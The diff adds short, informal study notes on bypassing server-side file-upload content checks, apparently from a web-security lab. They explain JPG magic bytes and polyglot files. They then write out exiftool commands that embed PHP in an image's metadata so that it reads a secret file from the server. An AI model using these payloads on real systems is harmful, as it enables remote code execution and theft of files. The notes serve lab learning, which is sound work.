@@ -1,0 +1,16 @@
+sometimes, the server actually inspect the content of the file uplaoded to check if it is the one expected or not.
+
+image files usually have properties like dimension which a php file wont have.
+jpg fie usually begin with a specific sequence of bytes 'FF D8 FF'. so when a jpg file dosent begin with that, it gets rejected.
+
+but special tools like exiftool can be used to create a polyglot which can contain malicious php code.
+a polyglot is a single file, script or payload that is valid in two or more programming languages simultaneously. 
+e.g phar-jpg is a valid jpg file but is read as a php file by the web server.
+
+i use exiftool to edit the metadata of a valid jpg file. 
+saw this code online: exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" 4.jpg -o polyglot.php
+
+the resulting polyglot.php file is a php file with the properties of a jpg image file.
+
+so i concatenated special string to easily identify the begining and end of the secret text i want to obtain
+i.e exiftool -Comment="<?php echo 'BEGIN'.file_get_contents('/home/carlos/secret').'STOP'; ?>" 4.jpg -o polyglot.jpg
